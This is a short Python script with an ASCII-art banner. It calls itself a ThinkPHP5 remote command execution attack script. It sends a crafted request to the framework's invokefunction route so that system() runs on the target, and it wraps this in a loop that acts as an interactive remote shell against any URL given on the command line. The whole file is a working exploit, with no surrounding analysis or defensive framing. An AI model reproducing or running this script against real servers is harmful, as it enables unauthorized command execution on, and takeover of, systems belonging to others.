"""
_______________#########_______________________
______________############_____________________
______________#############____________________
_____________##__###########___________________
____________###__######_#####__________________
____________###_#######___####_________________
___________###__##########_####________________
__________####__###########_####_______________
________#####___###########__#####_____________
_______######___###_########___#####___________
_______#####___###___########___######_________
______######___###__###########___######_______
_____######___####_##############__######______
____#######__#####################_#######_____
____#######__##############################____
___#######__######_#################_#######___
___#######__######_######_#########___######___
___#######____##__######___######_____######___
___#######________######____#####_____#####____
____######________#####_____#####_____####_____
_____#####________####______#####_____###______
______#####______;###________###______#________
________##_______####________####______________

ThinkPHP5 remote command execution vulnerability attack script
"""

from requests import get
from argparse import ArgumentParser

if __name__ == '__main__':
    parser = ArgumentParser(prog='ThinkPHP5 poc', usage='./attack.py [options: -u] <url>',
                            description="The ThinkPHP attack script")

    parser.add_argument("-u", "--url", dest="url", help="attack url")

    args = parser.parse_args()

    while (True):
        url = '{}?s=index/\\think\\app/invokefunction&function=call_user_func_array' \
              '&vars[0]=system&vars[1][]='.format(args.url)
        command = input("shell$ ")
        if command != "exit":
            payload = url + str(command)
            r = get(payload)
            print(r.text)
        else:
            break
